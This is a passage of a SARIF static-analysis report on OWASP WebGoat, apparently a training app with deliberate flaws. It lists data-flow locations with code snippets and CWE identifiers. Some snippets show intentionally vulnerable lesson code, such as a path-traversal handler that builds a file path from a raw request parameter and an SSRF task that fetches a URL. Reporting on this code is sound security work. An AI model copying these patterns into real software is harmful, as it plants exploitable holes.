            }
          },
          "kinds": [
            "acquire",
            "resource"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-container/src/main/resources/static/js/libs/jquery.form.js",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 217,
                "snippet": {
                  "text": "        options.complete = function(xhr, status) {"
                }
              },
              "contextRegion": {
                "startLine": 214,
                "endLine": 220,
                "snippet": {
                  "text": "\n     if (options.complete) {\n        var oldComplete = options.complete;\n        options.complete = function(xhr, status) {\n            var context = options.context || this;\n            oldComplete.apply(context, [xhr, status, $form]);\n        };\n"
                }
              }
            },
            "message": {
              "text": "Assignment to options.complete"
            }
          },
          "kinds": [
            "acquire",
            "resource"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-container/src/main/resources/static/js/jquery_form/jquery.form.js",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 217,
                "snippet": {
                  "text": "        options.complete = function(xhr, status) {"
                }
              },
              "contextRegion": {
                "startLine": 214,
                "endLine": 220,
                "snippet": {
                  "text": "\n     if (options.complete) {\n        var oldComplete = options.complete;\n        options.complete = function(xhr, status) {\n            var context = options.context || this;\n            oldComplete.apply(context, [xhr, status, $form]);\n        };\n"
                }
              }
            },
            "message": {
              "text": "Assignment to options.complete"
            }
          },
          "kinds": [
            "acquire",
            "resource"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-container/src/main/resources/static/js/jquery_form/jquery.form.js",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 373,
                "snippet": {
                  "text": "        s.context = s.context || s;"
                }
              },
              "contextRegion": {
                "startLine": 370,
                "endLine": 376,
                "snippet": {
                  "text": "        }\n\n        s = $.extend(true, {}, $.ajaxSettings, options);\n        s.context = s.context || s;\n        id = 'jqFormIO' + (new Date().getTime());\n        if (s.iframeTarget) {\n            $io = $(s.iframeTarget);\n"
                }
              }
            },
            "message": {
              "text": "Assignment to s.context"
            }
          },
          "kinds": [
            "acquire",
            "resource"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-container/src/main/resources/static/js/libs/jquery.form.js",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 373,
                "snippet": {
                  "text": "        s.context = s.context || s;"
                }
              },
              "contextRegion": {
                "startLine": 370,
                "endLine": 376,
                "snippet": {
                  "text": "        }\n\n        s = $.extend(true, {}, $.ajaxSettings, options);\n        s.context = s.context || s;\n        id = 'jqFormIO' + (new Date().getTime());\n        if (s.iframeTarget) {\n            $io = $(s.iframeTarget);\n"
                }
              }
            },
            "message": {
              "text": "Assignment to s.context"
            }
          },
          "kinds": [
            "acquire",
            "resource"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-container/src/main/resources/static/js/jquery_form/jquery.form.js",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 398,
                "snippet": {
                  "text": "            getAllResponseHeaders: function() {},"
                }
              },
              "contextRegion": {
                "startLine": 395,
                "endLine": 401,
                "snippet": {
                  "text": "            responseXML: null,\n            status: 0,\n            statusText: 'n/a',\n            getAllResponseHeaders: function() {},\n            getResponseHeader: function() {},\n            setRequestHeader: function() {},\n            abort: function(status) {\n"
                }
              }
            },
            "message": {
              "text": "Assignment to getAllResponseHeaders"
            }
          },
          "kinds": [
            "acquire",
            "resource"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-container/src/main/resources/static/js/libs/jquery.form.js",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 398,
                "snippet": {
                  "text": "            getAllResponseHeaders: function() {},"
                }
              },
              "contextRegion": {
                "startLine": 395,
                "endLine": 401,
                "snippet": {
                  "text": "            responseXML: null,\n            status: 0,\n            statusText: 'n/a',\n            getAllResponseHeaders: function() {},\n            getResponseHeader: function() {},\n            setRequestHeader: function() {},\n            abort: function(status) {\n"
                }
              }
            },
            "message": {
              "text": "Assignment to getAllResponseHeaders"
            }
          },
          "kinds": [
            "acquire",
            "resource"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-lessons/sql-injection/src/main/java/org/owasp/webgoat/sql_injection/introduction/SqlInjectionLesson10.java",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 100,
                "snippet": {
                  "text": "                System.err.println(e.getMessage());"
                }
              },
              "contextRegion": {
                "startLine": 97,
                "endLine": 103,
                "snippet": {
                  "text": "            if (errorMsg.contains(\"object not found: ACCESS_LOG\")) {\n                return false;\n            } else {\n                System.err.println(e.getMessage());\n                return false;\n            }\n        }\n"
                }
              }
            },
            "message": {
              "text": "getMessage(return)"
            }
          },
          "kinds": [
            "unknown"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-lessons/sql-injection/src/main/java/org/owasp/webgoat/sql_injection/introduction/SqlInjectionLesson8.java",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 139,
                "snippet": {
                  "text": "            System.err.println(e.getMessage());"
                }
              },
              "contextRegion": {
                "startLine": 136,
                "endLine": 142,
                "snippet": {
                  "text": "            Statement statement = connection.createStatement(TYPE_SCROLL_SENSITIVE, CONCUR_UPDATABLE);\n            statement.executeUpdate(logQuery);\n        } catch (SQLException e) {\n            System.err.println(e.getMessage());\n        }\n    }\n}\n"
                }
              }
            },
            "message": {
              "text": "getMessage(return)"
            }
          },
          "kinds": [
            "unknown"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-lessons/path-traversal/src/main/java/org/owasp/webgoat/path_traversal/ProfileUploadRetrieval.java",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 81,
                "snippet": {
                  "text": "            var id = request.getParameter(\"id\");"
                }
              },
              "contextRegion": {
                "startLine": 78,
                "endLine": 84,
                "snippet": {
                  "text": "            return ResponseEntity.badRequest().body(\"Illegal characters are not allowed in the query params\");\n        }\n        try {\n            var id = request.getParameter(\"id\");\n            var catPicture = new File(catPicturesDirectory, (id == null ? RandomUtils.nextInt(1, 11) : id) + \".jpg\");\n\n            if (catPicture.getName().toLowerCase().contains(\"path-traversal-secret.jpg\")) {\n"
                }
              }
            },
            "message": {
              "text": "getParameter(return)"
            }
          },
          "kinds": [
            "unknown"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-lessons/path-traversal/src/main/java/org/owasp/webgoat/path_traversal/ProfileUploadRetrieval.java",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 81,
                "snippet": {
                  "text": "            var id = request.getParameter(\"id\");"
                }
              },
              "contextRegion": {
                "startLine": 78,
                "endLine": 84,
                "snippet": {
                  "text": "            return ResponseEntity.badRequest().body(\"Illegal characters are not allowed in the query params\");\n        }\n        try {\n            var id = request.getParameter(\"id\");\n            var catPicture = new File(catPicturesDirectory, (id == null ? RandomUtils.nextInt(1, 11) : id) + \".jpg\");\n\n            if (catPicture.getName().toLowerCase().contains(\"path-traversal-secret.jpg\")) {\n"
                }
              }
            },
            "message": {
              "text": "Taint change on getParameter(return)"
            }
          },
          "kinds": [
            "unknown"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-lessons/path-traversal/src/main/java/org/owasp/webgoat/path_traversal/ProfileUploadRetrieval.java",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 81,
                "snippet": {
                  "text": "            var id = request.getParameter(\"id\");"
                }
              },
              "contextRegion": {
                "startLine": 78,
                "endLine": 84,
                "snippet": {
                  "text": "            return ResponseEntity.badRequest().body(\"Illegal characters are not allowed in the query params\");\n        }\n        try {\n            var id = request.getParameter(\"id\");\n            var catPicture = new File(catPicturesDirectory, (id == null ? RandomUtils.nextInt(1, 11) : id) + \".jpg\");\n\n            if (catPicture.getName().toLowerCase().contains(\"path-traversal-secret.jpg\")) {\n"
                }
              }
            },
            "message": {
              "text": "Assignment to id"
            }
          },
          "kinds": [
            "acquire",
            "resource"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-lessons/path-traversal/src/main/java/org/owasp/webgoat/path_traversal/ProfileUploadRetrieval.java",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 81,
                "snippet": {
                  "text": "            var id = request.getParameter(\"id\");"
                }
              },
              "contextRegion": {
                "startLine": 78,
                "endLine": 84,
                "snippet": {
                  "text": "            return ResponseEntity.badRequest().body(\"Illegal characters are not allowed in the query params\");\n        }\n        try {\n            var id = request.getParameter(\"id\");\n            var catPicture = new File(catPicturesDirectory, (id == null ? RandomUtils.nextInt(1, 11) : id) + \".jpg\");\n\n            if (catPicture.getName().toLowerCase().contains(\"path-traversal-secret.jpg\")) {\n"
                }
              }
            },
            "message": {
              "text": "Taint change on id"
            }
          },
          "kinds": [
            "unknown"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": ".mvn/wrapper/MavenWrapperDownloader.java",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 62,
                "snippet": {
                  "text": "                mavenWrapperProperties.load(mavenWrapperPropertyFileInputStream);"
                }
              },
              "contextRegion": {
                "startLine": 59,
                "endLine": 65,
                "snippet": {
                  "text": "            try {\n                mavenWrapperPropertyFileInputStream = new FileInputStream(mavenWrapperPropertyFile);\n                Properties mavenWrapperProperties = new Properties();\n                mavenWrapperProperties.load(mavenWrapperPropertyFileInputStream);\n                url = mavenWrapperProperties.getProperty(PROPERTY_NAME_WRAPPER_URL, url);\n            } catch (IOException e) {\n                System.out.println(\"- ERROR loading '\" + MAVEN_WRAPPER_PROPERTIES_PATH + \"'\");\n"
                }
              }
            },
            "message": {
              "text": "load(this)"
            }
          },
          "kinds": [
            "unknown"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": ".mvn/wrapper/MavenWrapperDownloader.java",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 63,
                "snippet": {
                  "text": "                url = mavenWrapperProperties.getProperty(PROPERTY_NAME_WRAPPER_URL, url);"
                }
              },
              "contextRegion": {
                "startLine": 60,
                "endLine": 66,
                "snippet": {
                  "text": "                mavenWrapperPropertyFileInputStream = new FileInputStream(mavenWrapperPropertyFile);\n                Properties mavenWrapperProperties = new Properties();\n                mavenWrapperProperties.load(mavenWrapperPropertyFileInputStream);\n                url = mavenWrapperProperties.getProperty(PROPERTY_NAME_WRAPPER_URL, url);\n            } catch (IOException e) {\n                System.out.println(\"- ERROR loading '\" + MAVEN_WRAPPER_PROPERTIES_PATH + \"'\");\n            } finally {\n"
                }
              }
            },
            "message": {
              "text": "getProperty(this['wrapperUrl'] : return)"
            }
          },
          "kinds": [
            "call",
            "function",
            "return"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": ".mvn/wrapper/MavenWrapperDownloader.java",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 63,
                "snippet": {
                  "text": "                url = mavenWrapperProperties.getProperty(PROPERTY_NAME_WRAPPER_URL, url);"
                }
              },
              "contextRegion": {
                "startLine": 60,
                "endLine": 66,
                "snippet": {
                  "text": "                mavenWrapperPropertyFileInputStream = new FileInputStream(mavenWrapperPropertyFile);\n                Properties mavenWrapperProperties = new Properties();\n                mavenWrapperProperties.load(mavenWrapperPropertyFileInputStream);\n                url = mavenWrapperProperties.getProperty(PROPERTY_NAME_WRAPPER_URL, url);\n            } catch (IOException e) {\n                System.out.println(\"- ERROR loading '\" + MAVEN_WRAPPER_PROPERTIES_PATH + \"'\");\n            } finally {\n"
                }
              }
            },
            "message": {
              "text": "Assignment to url"
            }
          },
          "kinds": [
            "acquire",
            "resource"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": ".mvn/wrapper/MavenWrapperDownloader.java",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 87,
                "snippet": {
                  "text": "            downloadFileFromURL(url, outputFile);"
                }
              },
              "contextRegion": {
                "startLine": 84,
                "endLine": 90,
                "snippet": {
                  "text": "        }\n        System.out.println(\"- Downloading to: \" + outputFile.getAbsolutePath());\n        try {\n            downloadFileFromURL(url, outputFile);\n            System.out.println(\"Done\");\n            System.exit(0);\n        } catch (Throwable e) {\n"
                }
              }
            },
            "message": {
              "text": "downloadFileFromURL(0)"
            }
          },
          "kinds": [
            "call",
            "function"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-lessons/challenge/src/main/java/org/owasp/webgoat/challenges/challenge7/Assignment7.java",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 63,
                "snippet": {
                  "text": "                URI uri = new URI(request.getRequestURL().toString());"
                }
              },
              "contextRegion": {
                "startLine": 60,
                "endLine": 66,
                "snippet": {
                  "text": "        if (StringUtils.hasText(email)) {\n            String username = email.substring(0, email.indexOf(\"@\"));\n            if (StringUtils.hasText(username)) {\n                URI uri = new URI(request.getRequestURL().toString());\n                Email mail = Email.builder()\n                        .title(\"Your password reset link for challenge 7\")\n                        .contents(String.format(TEMPLATE, uri.getScheme() + \"://\" + uri.getHost(), new PasswordResetLink().createPasswordReset(username, \"webgoat\")))\n"
                }
              }
            },
            "message": {
              "text": "getRequestURL(return)"
            }
          },
          "kinds": [
            "unknown"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-lessons/challenge/src/main/java/org/owasp/webgoat/challenges/challenge7/Assignment7.java",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 63,
                "snippet": {
                  "text": "                URI uri = new URI(request.getRequestURL().toString());"
                }
              },
              "contextRegion": {
                "startLine": 60,
                "endLine": 66,
                "snippet": {
                  "text": "        if (StringUtils.hasText(email)) {\n            String username = email.substring(0, email.indexOf(\"@\"));\n            if (StringUtils.hasText(username)) {\n                URI uri = new URI(request.getRequestURL().toString());\n                Email mail = Email.builder()\n                        .title(\"Your password reset link for challenge 7\")\n                        .contents(String.format(TEMPLATE, uri.getScheme() + \"://\" + uri.getHost(), new PasswordResetLink().createPasswordReset(username, \"webgoat\")))\n"
                }
              }
            },
            "message": {
              "text": "toString(this : return)"
            }
          },
          "kinds": [
            "call",
            "function",
            "return"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-lessons/challenge/src/main/java/org/owasp/webgoat/challenges/challenge7/MD5.java",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 57,
                "snippet": {
                  "text": "                    System.err.println(x.getMessage());"
                }
              },
              "contextRegion": {
                "startLine": 54,
                "endLine": 60,
                "snippet": {
                  "text": "                try {\n                    System.out.println(MD5.getHashString(new File(element)) + \" \" + element);\n                } catch (IOException x) {\n                    System.err.println(x.getMessage());\n                }\n            }\n        }\n"
                }
              }
            },
            "message": {
              "text": "getMessage(return)"
            }
          },
          "kinds": [
            "unknown"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": ".mvn/wrapper/MavenWrapperDownloader.java",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 48,
                "snippet": {
                  "text": "    public static void main(String args[]) {"
                }
              },
              "contextRegion": {
                "startLine": 45,
                "endLine": 51,
                "snippet": {
                  "text": "     */\n    private static final String PROPERTY_NAME_WRAPPER_URL = \"wrapperUrl\";\n\n    public static void main(String args[]) {\n        System.out.println(\"- Downloader started\");\n        File baseDirectory = new File(args[0]);\n        System.out.println(\"- Using base directory: \" + baseDirectory.getAbsolutePath());\n"
                }
              }
            },
            "message": {
              "text": "main(0)"
            }
          },
          "kinds": [
            "call",
            "function"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-lessons/ssrf/src/main/java/org/owasp/webgoat/ssrf/SSRFTask2.java",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 56,
                "snippet": {
                  "text": "                BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));"
                }
              },
              "contextRegion": {
                "startLine": 53,
                "endLine": 59,
                "snippet": {
                  "text": "            if (url.matches(\"http://ifconfig.pro\")) {\n                URL u = new URL(url);\n                URLConnection urlConnection = u.openConnection();\n                BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));\n                String inputLine;\n\n                while ((inputLine = in.readLine()) != null) {\n"
                }
              }
            },
            "message": {
              "text": "getInputStream(return)"
            }
          },
          "kinds": [
            "unknown"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-lessons/ssrf/src/main/java/org/owasp/webgoat/ssrf/SSRFTask2.java",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 56,
                "snippet": {
                  "text": "                BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));"
                }
              },
              "contextRegion": {
                "startLine": 53,
                "endLine": 59,
                "snippet": {
                  "text": "            if (url.matches(\"http://ifconfig.pro\")) {\n                URL u = new URL(url);\n                URLConnection urlConnection = u.openConnection();\n                BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));\n                String inputLine;\n\n                while ((inputLine = in.readLine()) != null) {\n"
                }
              }
            },
            "message": {
              "text": "InputStreamReader(0 : this)"
            }
          },
          "kinds": [
            "call",
            "function",
            "return"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-lessons/ssrf/src/main/java/org/owasp/webgoat/ssrf/SSRFTask2.java",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 56,
                "snippet": {
                  "text": "                BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));"
                }
              },
              "contextRegion": {
                "startLine": 53,
                "endLine": 59,
                "snippet": {
                  "text": "            if (url.matches(\"http://ifconfig.pro\")) {\n                URL u = new URL(url);\n                URLConnection urlConnection = u.openConnection();\n                BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));\n                String inputLine;\n\n                while ((inputLine = in.readLine()) != null) {\n"
                }
              }
            },
            "message": {
              "text": "BufferedReader(0 : this)"
            }
          },
          "kinds": [
            "call",
            "function",
            "return"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-lessons/ssrf/src/main/java/org/owasp/webgoat/ssrf/SSRFTask2.java",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 56,
                "snippet": {
                  "text": "                BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));"
                }
              },
              "contextRegion": {
                "startLine": 53,
                "endLine": 59,
                "snippet": {
                  "text": "            if (url.matches(\"http://ifconfig.pro\")) {\n                URL u = new URL(url);\n                URLConnection urlConnection = u.openConnection();\n                BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));\n                String inputLine;\n\n                while ((inputLine = in.readLine()) != null) {\n"
                }
              }
            },
            "message": {
              "text": "Assignment to in"
            }
          },
          "kinds": [
            "acquire",
            "resource"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-lessons/ssrf/src/main/java/org/owasp/webgoat/ssrf/SSRFTask2.java",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 59,
                "snippet": {
                  "text": "                while ((inputLine = in.readLine()) != null) {"
                }
              },
              "contextRegion": {
                "startLine": 56,
                "endLine": 62,
                "snippet": {
                  "text": "                BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));\n                String inputLine;\n\n                while ((inputLine = in.readLine()) != null) {\n                    html.append(inputLine);\n                }\n                in.close();\n"
                }
              }
            },
            "message": {
              "text": "readLine(this : return)"
            }
          },
          "kinds": [
            "call",
            "function",
            "return"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-lessons/ssrf/src/main/java/org/owasp/webgoat/ssrf/SSRFTask2.java",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 59,
                "snippet": {
                  "text": "                while ((inputLine = in.readLine()) != null) {"
                }
              },
              "contextRegion": {
                "startLine": 56,
                "endLine": 62,
                "snippet": {
                  "text": "                BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));\n                String inputLine;\n\n                while ((inputLine = in.readLine()) != null) {\n                    html.append(inputLine);\n                }\n                in.close();\n"
                }
              }
            },
            "message": {
              "text": "Assignment to inputLine"
            }
          },
          "kinds": [
            "acquire",
            "resource"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-lessons/ssrf/src/main/java/org/owasp/webgoat/ssrf/SSRFTask2.java",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 59,
                "snippet": {
                  "text": "                while ((inputLine = in.readLine()) != null) {"
                }
              },
              "contextRegion": {
                "startLine": 56,
                "endLine": 62,
                "snippet": {
                  "text": "                BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));\n                String inputLine;\n\n                while ((inputLine = in.readLine()) != null) {\n                    html.append(inputLine);\n                }\n                in.close();\n"
                }
              }
            },
            "message": {
              "text": "readLine(return)"
            }
          },
          "kinds": [
            "unknown"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-lessons/sql-injection/src/main/java/org/owasp/webgoat/sql_injection/introduction/SqlInjectionLesson9.java",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 77,
                "snippet": {
                  "text": "                System.err.println(e.getMessage());"
                }
              },
              "contextRegion": {
                "startLine": 74,
                "endLine": 80,
                "snippet": {
                  "text": "                    }\n                }\n            } catch (SQLException e) {\n                System.err.println(e.getMessage());\n                return failed(this).feedback(\"sql-injection.error\").output(\"<br><span class='feedback-negative'>\" + e.getMessage() + \"</span>\").build();\n            }\n\n"
                }
              }
            },
            "message": {
              "text": "getMessage(return)"
            }
          },
          "kinds": [
            "unknown"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-lessons/sql-injection/src/main/java/org/owasp/webgoat/sql_injection/introduction/SqlInjectionLesson9.java",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 84,
                "snippet": {
                  "text": "            System.err.println(e.getMessage());"
                }
              },
              "contextRegion": {
                "startLine": 81,
                "endLine": 87,
                "snippet": {
                  "text": "            return checkSalaryRanking(connection, output);\n\n        } catch (Exception e) {\n            System.err.println(e.getMessage());\n            return failed(this).feedback(\"sql-injection.error\").output(\"<br><span class='feedback-negative'>\" + e.getMessage() + \"</span>\").build();\n        }\n    }\n"
                }
              }
            },
            "message": {
              "text": "getMessage(return)"
            }
          },
          "kinds": [
            "unknown"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-lessons/challenge/src/main/java/org/owasp/webgoat/challenges/challenge7/MD5.java",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 49,
                "snippet": {
                  "text": "    public static void main(String[] args) {"
                }
              },
              "contextRegion": {
                "startLine": 46,
                "endLine": 52,
                "snippet": {
                  "text": "     * @param args command line arguments\n     * @since ostermillerutils 1.00.00\n     */\n    public static void main(String[] args) {\n        if (args.length == 0) {\n            System.err.println(\"Please specify a file.\");\n        } else {\n"
                }
              }
            },
            "message": {
              "text": "main(0)"
            }
          },
          "kinds": [
            "call",
            "function"
          ]
        },
        {
          "location": {
            "physicalLocation": {
              "artifactLocation": {
                "uri": "webgoat-lessons/challenge/src/main/java/org/owasp/webgoat/challenges/challenge7/MD5.java",
                "uriBaseId": "%SRCROOT%"
              },
              "region": {
                "startLine": 53,
                "snippet": {
                  "text": "            for (String element : args) {"
                }
              },
              "contextRegion": {
                "startLine": 50,
                "endLine": 56,
                "snippet": {
                  "text": "        if (args.length == 0) {\n            System.err.println(\"Please specify a file.\");\n        } else {\n            for (String element : args) {\n                try {\n                    System.out.println(MD5.getHashString(new File(element)) + \" \" + element);\n                } catch (IOException x) {\n"
                }
              }
            },
            "message": {
              "text": "Assignment to element"
            }
          },
          "kinds": [
            "acquire",
            "resource"
          ]
        }
      ],
      "taxonomies": [
        {
          "guid": "25F72D7E-8A92-459D-AD67-64853F788765",
          "name": "CWE",
          "organization": "MITRE",
          "shortDescription": {
            "text": "The MITRE Common Weakness Enumeration"
          },
          "taxa": [
            {
              "id": "571"
            },
            {
              "id": "570"
            },
            {
              "id": "352"
            },
            {
              "id": "497"
            },
            {
              "id": "None"
            },
            {
              "id": "398"
            },
            {
              "id": "328"
            },
            {
              "id": "730"
            },
            {
              "id": "13"
            },
            {
              "id": "260"
            },
            {
              "id": "555"
            },
            {
              "id": "99"
            },
            {
              "id": "597"
            },
            {
              "id": "335"
            },
            {
              "id": "561"
            },
            {
              "id": "253"
            },
            {
              "id": "690"
            },
            {
              "id": "338"
            },
            {
              "id": "89"
            },
            {
              "id": "502"
            },
            {
              "id": "397"
            },
            {
              "id": "321"
            },
            {
              "id": "489"
            },
            {
              "id": "77"
            },
            {
              "id": "78"
            },
            {
              "id": "404"
            },
            {
              "id": "615"
            },
            {
              "id": "246"
            },
            {
              "id": "476"
            },
            {
              "id": "22"
            },
            {
              "id": "73"
            },
            {
              "id": "396"
            },
            {
              "id": "391"
            },
            {
              "id": "259"
            },
            {
              "id": "209"
            },
            {
              "id": "431"
            },
            {
              "id": "486"
            },
            {
              "id": "798"
            },
            {
              "id": "382"
            },
            {
              "id": "95"
            },
            {
              "id": "494"
            },
            {
              "id": "614"
            },
            {
              "id": "563"
            },
            {
              "id": "247"
            },
            {
              "id": "292"
            },
            {
              "id": "558"
            },
            {
              "id": "807"
            },
            {
              "id": "474"
            },
            {
              "id": "252"
            },
            {
              "id": "754"
            }
          ]
        }
      ]
    }]
}